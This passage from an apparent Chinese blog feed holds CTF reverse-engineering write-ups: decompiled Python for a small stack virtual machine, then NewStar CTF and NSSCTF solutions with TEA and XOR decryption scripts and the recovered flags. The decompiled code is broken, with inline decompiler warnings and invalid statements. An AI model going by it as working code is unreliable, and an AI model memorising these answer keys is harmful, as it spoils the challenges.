class="number">130</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_20123c25</span>:</span><br><span class="line">    _7cb79e4b = <span class="number">240</span></span><br><span class="line">    _b44f7700 = <span class="number">241</span></span><br><span class="line">    _fbdb45b4 = <span class="number">242</span></span><br><span class="line">    _ceb71abe = <span class="number">243</span></span><br><span class="line">    _8c16a52d = <span class="number">244</span></span><br><span class="line">    _38a31ca7 = <span class="number">245</span></span><br><span class="line">    _97406181 = <span class="number">246</span></span><br><span class="line">    _2cc0f75f = <span class="number">247</span></span><br><span class="line">    _1a5742f5 = <span class="number">248</span></span><br><span class="line">    _e3f3ae4d = <span class="number">249</span></span><br><span class="line">    _749af0a3 = <span class="number">250</span></span><br><span class="line">    _d1654b69 = <span class="number">251</span></span><br><span class="line">    _57da3130 = <span class="number">252</span></span><br><span class="line">    _5b84e015 = <span class="number">253</span></span><br><span class="line">    _20285265 = <span class="number">254</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_fdd4e0af</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self._01111091 = []</span><br><span class="line">        self._ca6cab33 = []</span><br><span class="line">        self._da4e2ce1 = <span class="number">0</span></span><br><span class="line">        self._35d0bf74 = &#123; &#125;</span><br><span class="line">        self._1351c19a = &#123; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_977a3a1c</span>(<span class="params">self, value</span>):</span><br><span class="line">        self._01111091.append(value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_bf001739</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._01111091:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&#x27;something wrong..&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>._01111091.pop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_dd931be4</span>(<span class="params">self</span>):</span><br><span class="line">Warning: Stack history <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">        _35d0bf74 = &#123; &#125;</span><br><span class="line">        _da4e2ce1 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> _da4e2ce1 &lt; <span class="built_in">len</span>(self._ca6cab33):</span><br><span class="line">            <span class="keyword">if</span> self._ca6cab33[_da4e2ce1] == _20123c25._1a5742f5:</span><br><span class="line">                _aac5228e = self._ca6cab33[_da4e2ce1 + <span class="number">1</span>]</span><br><span class="line">                _35d0bf74[_aac5228e] = _da4e2ce1</span><br><span class="line">                _da4e2ce1 += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                _da4e2ce1 += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> _da4e2ce1 &lt; <span class="built_in">len</span>(self._ca6cab33):</span><br><span class="line">                <span class="keyword">return</span> _35d0bf74</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_fbdb45b4</span>(<span class="params">self</span>):</span><br><span class="line">        _11d53c86 = self._bf001739()</span><br><span class="line">        _65fcba24 = self._bf001739()</span><br><span class="line">        self._977a3a1c(_65fcba24 &amp; _11d53c86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_ceb71abe</span>(<span class="params">self</span>):</span><br><span class="line">        _11d53c86 = self._bf001739()</span><br><span class="line">        _65fcba24 = self._bf001739()</span><br><span class="line">        self._977a3a1c(_65fcba24 | _11d53c86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_8c16a52d</span>(<span class="params">self</span>):</span><br><span class="line">        _65fcba24 = self._bf001739()</span><br><span class="line">        self._977a3a1c(~_65fcba24)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_38a31ca7</span>(<span class="params">self</span>):</span><br><span class="line">        _11d53c86 = self._bf001739()</span><br><span class="line">        _65fcba24 = self._bf001739()</span><br><span class="line">        self._977a3a1c(_65fcba24 ^ _11d53c86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_97406181</span>(<span class="params">self</span>):</span><br><span class="line">        _aac5228e = self._ca6cab33[self._da4e2ce1]</span><br><span class="line">        self._da4e2ce1 = self._35d0bf74[_aac5228e]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_2cc0f75f</span>(<span class="params">self</span>):</span><br><span class="line">        _aac5228e = self._ca6cab33[self._da4e2ce1]</span><br><span class="line">        self._da4e2ce1 += <span class="number">1</span></span><br><span class="line">        _11d53c86 = self._bf001739()</span><br><span class="line">        _65fcba24 = self._bf001739()</span><br><span class="line">        <span class="keyword">if</span> _11d53c86 == _65fcba24:</span><br><span class="line">            self._da4e2ce1 = self._35d0bf74[_aac5228e]</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_e3f3ae4d</span>(<span class="params">self</span>):</span><br><span class="line">        _c5baa923 = self._bf001739()</span><br><span class="line">        self._977a3a1c(<span class="built_in">len</span>(_c5baa923))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_749af0a3</span>(<span class="params">self</span>):</span><br><span class="line">        _c5baa923 = self._bf001739()</span><br><span class="line">        _ace0efc8 = self._bf001739()</span><br><span class="line">        self._977a3a1c(<span class="built_in">ord</span>(_c5baa923[_ace0efc8]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_d1654b69</span>(<span class="params">self</span>):</span><br><span class="line">        _95e1fdb8 = self._bf001739()</span><br><span class="line">        _550cd13d = self._ca6cab33[self._da4e2ce1]</span><br><span class="line">        <span class="keyword">if</span> _550cd13d == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> _550cd13d <span class="keyword">not</span> <span class="keyword">in</span> self._1351c19a:</span><br><span class="line">                self._1351c19a[_550cd13d] = []</span><br><span class="line">            self._1351c19a[_550cd13d].append(_95e1fdb8)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._1351c19a[_550cd13d] = _95e1fdb8</span><br><span class="line">        self._da4e2ce1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_57da3130</span>(<span class="params">self</span>):</span><br><span class="line">        _550cd13d = self._ca6cab33[self._da4e2ce1]</span><br><span class="line">        self._977a3a1c(self._1351c19a[_550cd13d])</span><br><span class="line">        self._da4e2ce1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_5b84e015</span>(<span class="params">self</span>):</span><br><span class="line">        _11d53c86 = self._bf001739()</span><br><span class="line">        _65fcba24 = self._bf001739()</span><br><span class="line">        self._977a3a1c(_65fcba24 + _11d53c86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_20285265</span>(<span class="params">self</span>):</span><br><span class="line">        _11d53c86 = self._bf001739()</span><br><span class="line">        _65fcba24 = self._bf001739()</span><br><span class="line">        self._977a3a1c(_65fcba24 - _11d53c86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_75b873e6</span>(<span class="params">self, _b75d3e2a</span>):</span><br><span class="line">        self._ca6cab33 = _b75d3e2a</span><br><span class="line">        self._da4e2ce1 = <span class="number">0</span></span><br><span class="line">        self._35d0bf74 = self._dd931be4()</span><br><span class="line">        <span class="keyword">if</span> self._da4e2ce1 &lt; <span class="built_in">len</span>(self._ca6cab33):</span><br><span class="line">            _5ff494f7 = self._ca6cab33[self._da4e2ce1]</span><br><span class="line">            self._da4e2ce1 += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> _5ff494f7 == _20123c25._7cb79e4b:</span><br><span class="line">                _95e1fdb8 = self._ca6cab33[self._da4e2ce1]</span><br><span class="line">                self._da4e2ce1 += <span class="number">1</span></span><br><span class="line">                self._977a3a1c(_95e1fdb8)</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._b44f7700:</span><br><span class="line">                self._bf001739()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._fbdb45b4:</span><br><span class="line">                self._fbdb45b4()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._ceb71abe:</span><br><span class="line">                self._ceb71abe()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._8c16a52d:</span><br><span class="line">                self._8c16a52d()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._38a31ca7:</span><br><span class="line">                self._38a31ca7()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._97406181:</span><br><span class="line">                self._97406181()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._2cc0f75f:</span><br><span class="line">                self._2cc0f75f()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._1a5742f5:</span><br><span class="line">                self._da4e2ce1 += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._e3f3ae4d:</span><br><span class="line">                self._e3f3ae4d()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._749af0a3:</span><br><span class="line">                self._749af0a3()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._d1654b69:</span><br><span class="line">                self._d1654b69()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._57da3130:</span><br><span class="line">                self._57da3130()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._5b84e015:</span><br><span class="line">                self._5b84e015()</span><br><span class="line">            <span class="keyword">elif</span> _5ff494f7 == _20123c25._20285265:</span><br><span class="line">                self._20285265()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self._da4e2ce1 &lt; <span class="built_in">len</span>(self._ca6cab33):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_55d43f6f</span>(<span class="params">self, _5345245d</span>):</span><br><span class="line">        _ca6cab33 = [][_20123c25._7cb79e4b][_5345245d][_20123c25._e3f3ae4d][_20123c25._d1654b69][<span class="string">&#x27;l1&#x27;</span>][_20123c25._7cb79e4b][<span class="number">0</span>][_20123c25._d1654b69][<span class="string">&#x27;i&#x27;</span>][_20123c25._1a5742f5][<span class="string">&#x27;s&#x27;</span>][_20123c25._57da3130][<span class="string">&#x27;l1&#x27;</span>][_20123c25._7cb79e4b][<span class="number">1</span>][_20123c25._20285265][_20123c25._57da3130][<span class="string">&#x27;i&#x27;</span>][_20123c25._2cc0f75f][<span class="string">&#x27;e&#x27;</span>][_20123c25._57da3130][<span class="string">&#x27;i&#x27;</span>][_20123c25._7cb79e4b][_5345245d][_20123c25._749af0a3][_20123c25._57da3130][<span class="string">&#x27;i&#x27;</span>][_20123c25._7cb79e4b][<span class="number">1</span>][_20123c25._5b84e015][_20123c25._7cb79e4b][_5345245d][_20123c25._749af0a3][_20123c25._38a31ca7][_20123c25._d1654b69][<span class="string">&#x27;r&#x27;</span>][_20123c25._57da3130][<span class="string">&#x27;i&#x27;</span>][_20123c25._7cb79e4b][<span class="number">1</span>][_20123c25._5b84e015][_20123c25._d1654b69][<span class="string">&#x27;i&#x27;</span>][_20123c25._97406181][<span class="string">&#x27;s&#x27;</span>][_20123c25._1a5742f5][<span class="string">&#x27;e&#x27;</span>][_20123c25._57da3130][<span class="string">&#x27;i&#x27;</span>][_20123c25._7cb79e4b][_5345245d][_20123c25._749af0a3][_20123c25._7cb79e4b][<span class="number">255</span>][_20123c25._38a31ca7][_20123c25._d1654b69][<span class="string">&#x27;r&#x27;</span>]</span><br><span class="line">        self._75b873e6(_ca6cab33)</span><br><span class="line">        _5e2e5337 = self._1351c19a[<span class="string">&#x27;r&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> _5e2e5337</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="45-56-Newstar-CTF"><a href="#45-56-Newstar-CTF" class="headerlink" title="45-56 Newstar CTF"></a>45-56 Newstar CTF</h2><h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>脱壳，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/36175641/1728221448720-13dd8ea8-de9c-4af1-9373-d482160b49e1.png" alt="img"></p><p>flag{Do_you_know_UPX?}</p><h4 id="drink-TEA"><a href="#drink-TEA" class="headerlink" title="*drink_TEA"></a>*drink_TEA</h4><p>TEA加密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void tea_dec(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0 = v[0], v1 = v[1];  // v0、v1分别是密文的左、右半部分</span><br><span class="line">    uint32_t delta =  0x61C88647;     //作为sum每次累加的变化值，题目中往往会修改此值</span><br><span class="line">    uint32_t sum = 32 * delta;      //此处需要分析32轮加密结束后sum的值与delta的变化, 以此处加密为例子，32轮每次sum+=delta，因此最后sum=32*delta</span><br><span class="line">    for (int i = 0; i &lt; 32; i++) &#123;  // tea加密进行32轮</span><br><span class="line">        //根据加密时的顺序颠倒下面3行的顺序，将加法改为减法（异或部分都是整体，不用管），就是逆向解密过程</span><br><span class="line">        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    // 解密后的内容要还给v数组</span><br><span class="line">    v[0] = v0;</span><br><span class="line">    v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main() &#123;</span><br><span class="line">    uint32_t k[4] = &#123;0x636C6557,0x54656D6F,0x77654E6F,0x72617453&#125;;</span><br><span class="line">    int8_t input[33] = &#123;  0x78, 0x20, 0xF7, 0xB3, 0xC5, 0x42, 0xCE, 0xDA, 0x85, 0x59, </span><br><span class="line">  0x21, 0x1A, 0x26, 0x56, 0x5A, 0x59, 0x29, 0x02, 0x0D, 0xED, </span><br><span class="line">  0x07, 0xA8, 0xB9, 0xEE, 0x36, 0x59, 0x11, 0x87, 0xFD, 0x5C, </span><br><span class="line">  0x23, 0x24&#125;;</span><br><span class="line"> </span><br><span class="line">    for (int i = 0; i &lt; 32; i += 8) &#123;</span><br><span class="line">        uint32_t v[2] = &#123;*(uint32_t*)&amp;input[i], *(uint32_t*)&amp;input[i + 4]&#125;;</span><br><span class="line">        tea_dec(v, k);</span><br><span class="line">        </span><br><span class="line">        for (int j = 0; j &lt; 2; j++) &#123;</span><br><span class="line">            for (int k = 0; k &lt; 4; k++) &#123;</span><br><span class="line">                printf(&quot;%c&quot;, v[j] &amp; 0xff);</span><br><span class="line">                v[j] &gt;&gt;= 8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/1728562726425-bb959236-f66a-4e1b-924f-4c0dad5c0f36.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/36175641/1728562725546-696167da-9b6c-4b48-9751-2abb5a76f246.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enflag = [2,5,19,19,2,30,83,31,92,26,39,67,29,54,67,7,38,45,85,13,3,27,28,45,2,28,28,48,56,50,85,2,27,22,84,15]</span><br><span class="line">key = &#x27;dirty_flower&#x27;</span><br><span class="line">for i in range(36):</span><br><span class="line">    print(chr(enflag[i]^ord(key[i%len(key)])&amp;0xff),end=&#x27;&#x27;)</span><br><span class="line">#flag&#123;A5s3mB1y_1s_r3ally_funDAm3nta1&#125;</span><br></pre></td></tr></table></figure><h4 id="ezencrypt"><a href="#ezencrypt" class="headerlink" title="*ezencrypt"></a>*ezencrypt</h4><h4 id="Pangbai泰拉记"><a href="#Pangbai泰拉记" class="headerlink" title="*Pangbai泰拉记"></a>*Pangbai泰拉记</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = [0x6B, 0x65, 0x79, 0x31, 0x6B, 0x65, 0x79, 0x32, 0x6B, 0x65, 0x79, 0x33, 0x6B, 0x65, 0x79, 0x34, 0x6B, 0x65, 0x79, 0x36,  0x6B, 0x65, 0x79, 0x37, 0x6B, 0x65, 0x79, 0x38, 0x6B, 0x65, 0x79, 0x39]</span><br><span class="line">flag = [ 0x63, 0x61, 0x6E, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x6D, 0x65, 0x20, 0x63, 0x61, 0x6E, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x6D, 0x65, 0x3F]</span><br><span class="line">aaa=&#x27;nhvviCSR&#123;e8%oCrdepIvebcRb&gt;&amp;ah&#123;b&gt;&amp;ah&#123;&#x27;</span><br><span class="line">v5 = &#x27;nhvviguMI?u\&quot;,o/fWivoM;Homy2.l#&#123;&#x27;</span><br><span class="line">for i in range(len(v5)):</span><br><span class="line">    print(chr(key[i]^ord(v5[i])),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><h4 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h4><p> flag{Do_you_really_know_ptrace?}</p><h4 id="begin"><a href="#begin" class="headerlink" title="begin"></a>begin</h4><p>打开IDA</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005124925519.png" alt="image-20241005124925519"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005125051687.png" alt="image-20241005125051687"></p><p><strong>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</strong></p><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>密文告了，表也换了，扔cyberchef里ok</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005125142014.png" alt="image-20241005125142014"></p><p><strong>flag{y0u_kn0w_base64_well}</strong></p><h4 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = [ <span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x34</span>, <span class="number">0x48</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x88</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x6A</span>, <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0xA2</span>, <span class="number">0x0A</span>, <span class="number">0x37</span>, <span class="number">0x5C</span>, <span class="number">0x07</span>, <span class="number">0x5A</span>, <span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x12</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x8E</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]+<span class="number">0x1f</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">3</span> ==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]-<span class="number">0x29</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]^<span class="number">0x55</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">     </span><br><span class="line"><span class="comment"># flag&#123;IT_15_R3Al1y_V3Ry-51Mp1e&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h4><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005120848944.png" alt="image-20241005120848944"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005120912817.png" alt="image-20241005120912817"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005124636944.png" alt="image-20241005124636944"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241005121101080.png" alt="image-20241005121101080"></p><p>part5,用IDA打开就是</p><p><strong>flag{Y0u_@r4_900d_andr01d_r4V4rs4r}</strong></p><h4 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h4><p>动调，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;ATRI&quot;</span></span><br><span class="line">flag = [  <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x39</span>, <span class="number">0x2D</span>, <span class="number">0x3A</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x09</span>, <span class="number">0x22</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x09</span>, <span class="number">0x24</span>, <span class="number">0x75</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x1C</span>, <span class="number">0x05</span>, <span class="number">0x01</span>,<span class="number">0x12</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x2b</span>,<span class="number">0x6f</span>,<span class="number">0x3e</span>]</span><br><span class="line"></span><br><span class="line">decrypted_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    decrypted_flag += <span class="built_in">chr</span>(<span class="number">0x17</span>^flag[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, decrypted_flag)</span><br><span class="line"><span class="comment"># flag&#123;y0u_ar3_g0od_@_Debu9&#125;</span></span><br></pre></td></tr></table></figure><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Re百题计划（&quot;&gt;&lt;a href=&quot;#Re百题计划（&quot; class=&quot;headerlink&quot; title=&quot;Re百题计划（&quot;&gt;&lt;/a&gt;Re百题计划（&lt;/h1&gt;&lt;h2 id=&quot;1-你是真的大学生吗？&quot;&gt;&lt;a href=&quot;#1-你是真的大学生吗？&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/04/16/NSSCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/04/16/NSSCTF/</id>
    <published>2024-04-15T16:00:00.000Z</published>
    <updated>2024-09-16T07:16:24.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h3 id="SWPUCTF-2021-新生赛-简简单单的逻辑"><a href="#SWPUCTF-2021-新生赛-简简单单的逻辑" class="headerlink" title="[SWPUCTF 2021 新生赛]简简单单的逻辑"></a>[SWPUCTF 2021 新生赛]简简单单的逻辑</h3><p>题目：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    result = result + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(flag[i])^key))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv23598163/">SWPUCTF 2021 新生赛]简简单单的逻辑 - 哔哩哔哩 (bilibili.com)</a></p><blockquote><p>首先要掌握的知识点：</p><p>字符串转ASCII </p><p>print(ord(‘a’))   #97</p><p>ASCII转字符串</p><p>print(chr(97))  #a</p><p>切片:<a href="https://www.jianshu.com/p/15715d6f4dad">https://www.jianshu.com/p/15715d6f4dad</a></p><p>十进制转十六进制</p><p>print(hex(10)) #a</p><p>十六进制转十进制</p><p>print(int(‘a’,16))  #10</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span></span><br><span 